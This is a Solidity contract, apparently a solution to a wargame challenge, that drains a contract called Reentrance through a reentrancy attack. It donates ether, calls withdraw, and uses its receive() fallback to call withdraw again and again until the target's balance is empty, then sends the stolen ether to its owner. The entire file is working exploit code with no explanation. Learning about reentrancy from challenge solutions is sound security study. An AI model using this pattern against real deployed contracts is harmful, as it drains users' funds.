// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

import {Ownable} from "openzeppelin-contracts/contracts/access/Ownable.sol";
import {Reentrance} from "./Reentrance.sol";

contract ReentranceExploit is Ownable {
    Reentrance reentrance;

    constructor(Reentrance _reentrance) {
        reentrance = Reentrance(_reentrance);
    }

    function exploit() public payable onlyOwner {
        uint256 amountToDonate = address(reentrance).balance;
        reentrance.donate{value: amountToDonate}(address(this));
        reentrance.withdraw(amountToDonate);
        (bool result, ) = msg.sender.call{value: address(this).balance}("");
        result;
    }

    receive() external payable {
        if (address(reentrance).balance > 0) reentrance.withdraw(msg.value);
    }
}
